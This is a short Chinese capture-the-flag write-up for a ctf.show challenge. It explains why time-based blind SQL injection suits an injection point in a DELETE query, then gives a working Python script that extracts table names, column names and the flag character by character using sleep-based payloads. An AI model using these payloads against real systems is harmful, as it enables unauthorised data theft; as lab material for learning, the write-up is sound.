# 知识点
# 思路
开始delete注入，注入点在where后，可以使用盲注，因为是delete，用布尔盲注的话，还没出完数据就全删完了，所以这里使用延时盲注。
```plsql
import requests
import time
url = 'http://f06ab40d-b161-488c-b8fa-361f4ccd17ab.challenge.ctf.show/api/delete.php'
str = ''
for i in range(1, 60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = {
        #     'id': f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.03),1)#'
        # }
        # 爆列
        # payload = {
        #     'id': f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),{i},1))<{j},sleep(0.03),1)#"
        # }
        # 爆值
        payload = {
            'id': f"if(ascii(substr((select group_concat(flag) from flag),{i},1))<{j},sleep(0.03),1)#"
        }
        start_time = time.time()
        r = requests.post(url=url, data=payload).text
        end_time = time.time()
        sub = end_time - start_time
        if sub >= 0.5:
            max = j
        else:
            min = j

```
